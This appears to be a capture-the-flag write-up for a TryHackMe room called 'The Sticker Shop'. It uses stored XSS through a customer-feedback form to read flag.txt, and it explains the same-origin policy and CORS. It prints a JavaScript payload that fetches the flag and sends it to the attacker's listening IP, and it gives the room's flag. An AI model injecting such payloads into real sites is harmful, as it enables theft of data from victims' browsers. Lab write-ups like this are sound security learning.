# The Sticker Shop

### The sticker shop is finally online!
- What is the content of flag.txt?<br />
Initial scan shows port 22 and 8080 open:<br />
![image](https://github.com/user-attachments/assets/3c226334-4a0a-4938-8bc6-990b96401200)<br />
Looking at the webpage, there's a page to send customer feedback:<br />
![image](https://github.com/user-attachments/assets/18c3de7a-9635-46ff-a8da-edd3f4526399)<br />
Since the room is suggesting that the developers use the same computer for hosting the website and for looking at customer feedback, my first guess is that I need to do XSS. <br />
After some time of trying payloads, the correct one to get the flag is provided in the file named `payload` in this folder. Remember to change the script to adapt to your IP address and to first open a web server with `python3 -m http.server PORT`<br />
![image](https://github.com/user-attachments/assets/92871c0f-5ccf-454a-a8ce-392bd540f844)<br />
`THM{83789a69074f636f64a38879cfcabe8b62305ee6}`

### What I've learned
I honestly thought that the right payload could also be the following: 

    <script>
    fetch('http://10.10.17.174:8080/flag.txt')
        .then(response => response.text())
        .then(data => {
            fetch('http://10.11.85.53:8001/?flag=' + encodeURIComponent(data));
        })
    </script>
Where the only difference is that instead of the local IP address `127.0.0.1`, I put `10.10.17.174`, which is the IP address of my target machine instance. I spent hours trying to make it work, but it didn't. Why didn't it work? The reason is called **same origin policy(SOP)**.<br /><br />
Same Origin Policy is a security measure implemented by web browsers that allows **JavaScript code executed on a web page to access resources only from the same origin**, which encompasses the same domain, protocol, and port combination.<br />
Suppose I send a request to `http://example.com/index.html`, and then the html of this page contains a script like the following: 

    <script>
    fetch('http://api.otherdomain.com/secret-data.json')
      .then(response => response.text())
      .then(data => console.log('Content:', data))
    </script>  
Technically, at this point my browser should execute this javascript, and make a request to `http://api.otherdomain.com/secret-data.json`. However this does not happen, because every modern browser, including mine, implements SOP. In this case, my browser can see that I made a request to `http://example.com`, but then I need to execute a javascript code and fetch data from another domain. Everytime a website wants me to fetch a resource, my browser checks if that resource is from the same protocol(http), domain(example.com) and port(80) of the original website. Since `api.otherdomain.com` is different from `example.com`, my browser won't fetch the resource. This policy prevents requests between different origins and restricts browser-based attacks. <br /><br />
In the case of this CTF, the victim(the staff)'s browser probably accessed the webpage not with `http://10.10.17.174`, but with `http://127.0.0.1`. This means that first, the staff views the feedback page(by fuzzing the server with XSS payloads I found out a `/view_feedback` directory). This page would then contain our injected javascript, that tries to fetch data from `10.10.17.174`, which even if is technically the same resource, to the browser it is different from `127.0.0.1`. This is the reason why it didn't work, and I'm happy I learned something new. <br /> <br />
Another thing. To overcome the limitations imposed by the SOP, **Cross-Origin Resource Sharing (CORS)** was introduced. CORS allows a web browser to relax the restrictions and grant access to its resources for requests coming from a different origin. It is an HTTP header-based mechanism.<br />
When a web browser makes a request to a different origin (domain, protocol, or port), the browser initiates a CORS process to determine if the requested resource should be accessible. The server, in response, includes the `Access-Control-Allow-Origin` header in its HTTP response. This header specifies the allowed origins that are permitted to access the requested resource.




